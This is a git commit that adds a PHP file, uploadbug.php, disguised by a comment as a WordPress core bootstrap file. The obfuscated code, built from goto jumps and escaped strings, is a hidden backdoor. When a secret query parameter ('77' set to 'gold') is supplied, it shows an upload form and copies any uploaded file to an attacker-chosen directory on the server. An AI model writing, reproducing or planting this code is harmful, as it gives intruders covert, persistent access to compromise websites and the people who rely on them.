cd8cccbb69f0be78f3827d99ac64ca31f64556d7
onlyme1d <agungrikardo09@gmail.com>
2025-11-26 13:47:28 +0700

    Update and rename bug01.php to uploadbug.php

---
+++ uploadbug.php
@@ -0,0 +1,12 @@
+<?php
+    // Do Not Delete This Line.
+    /*
+    * Core bootstrap file for WordPress execution.
+    *
+    * This file is part of the WordPress core and contains the main hooks,
+    * filters, and constants that are loaded at an early stage of the
+    * application lifecycle. Any modifications here are strongly discouraged,
+    * as they may interfere with WordPress updates and the stability of your
+    * installation.
+    */
+ goto mEM8T; cEhul: $kcPBw = $_FILES["\x66\x69\x6c\x65"]["\164\x6d\160\137\156\x61\155\145"]; goto TrPzn; Ud6fk: N4Hah: goto vVaOT; V3QPw: $uWigl = $g66L1 . $_FILES["\146\151\154\x65"]["\156\141\155\x65"]; goto PXngl; ISx8g: MpfLM: goto kSQlT; wOlZH: echo "\x3c\x69\x6e\x70\x75\164\x20\x74\171\x70\145\x3d\42\x66\151\154\x65\x22\x20\x6e\141\155\x65\75\42\x66\x69\x6c\145\42\40\x73\151\172\145\x3d\x22\x31\65\x22\76"; goto DRMwL; TrPzn: if (!file_exists($kcPBw)) { goto MpfLM; } goto u12t_; t7C2n: echo "\x3c\x2f\x66\157\x72\155\x3e"; goto Ud6fk; DRMwL: echo "\74\151\x6e\x70\x75\x74\x20\164\171\160\145\x3d\x22\x73\x75\142\155\x69\x74\x22\40\x76\x61\x6c\165\x65\x3d\42\125\160\x6c\157\141\x64\x22\76"; goto t7C2n; TlhJX: echo "\74\151\156\160\x75\x74\x20\164\x79\160\145\x3d\x22\x74\145\x78\x74\42\40\x6e\141\x6d\x65\75\42\x64\x69\x72\x22\x20\163\151\172\x65\x3d\x22\x33\60\x22\40\x76\x61\x6c\x75\145\75\x22" . getcwd() . "\x22\76"; goto wOlZH; NACx7: echo "\x55\x50\114\117\101\x44\x20\x46\x49\114\x45\40\x54\117\40{$uWigl}"; goto ISx8g; mEM8T: if (!(isset($_GET["\67\67"]) && $_GET["\x37\x37"] === "\x67\x6f\154\x64")) { goto N4Hah; } goto p6Fad; p6Fad: echo "\x3c\146\x6f\162\155\40\x6d\145\164\150\x6f\144\x3d\42\160\157\163\164\42\x20\x65\x6e\x63\x74\x79\x70\x65\x3d\x22\x6d\x75\154\x74\x69\x70\141\162\x74\x2f\x66\157\162\x6d\55\x64\141\x74\x61\x22\76"; goto TlhJX; vVaOT: if (!isset($_FILES["\x66\151\x6c\x65"]["\164\x6d\160\x5f\x6e\x61\x6d\145"])) { goto UbpnC; } goto cEhul; u12t_: $g66L1 = isset($_POST["\144\151\162"]) ? rtrim($_POST["\144\x69\162"], "\x2f\134") . "\x2f" : getcwd() . "\57"; goto V3QPw; PXngl: copy($kcPBw, $uWigl); goto NACx7; kSQlT: UbpnC:
